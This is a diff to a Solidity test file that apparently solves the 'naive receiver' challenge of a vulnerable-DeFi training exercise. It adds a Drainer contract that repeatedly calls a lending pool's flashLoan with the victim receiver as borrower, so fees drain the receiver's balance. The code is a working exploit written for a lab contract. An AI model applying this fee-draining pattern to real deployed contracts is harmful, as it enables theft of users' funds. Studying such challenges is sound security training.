@@ -6,7 +6,13 @@ import "forge-std/Test.sol";
 
 import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
 import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
-
+contract Drainer {
+    function drain(address pool, address borrower) public {
+        for(uint256 i = 0; i < 10; i++){
+            NaiveReceiverLenderPool(payable(pool)).flashLoan(borrower, 0);
+        }
+    }
+}
 contract NaiveReceiver is Test {
     uint256 internal constant ETHER_IN_POOL = 1_000e18;
     uint256 internal constant ETHER_IN_RECEIVER = 10e18;
@@ -48,7 +54,10 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        Drainer drainer = new Drainer();
+        drainer.drain(address(naiveReceiverLenderPool), address(flashLoanReceiver));
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
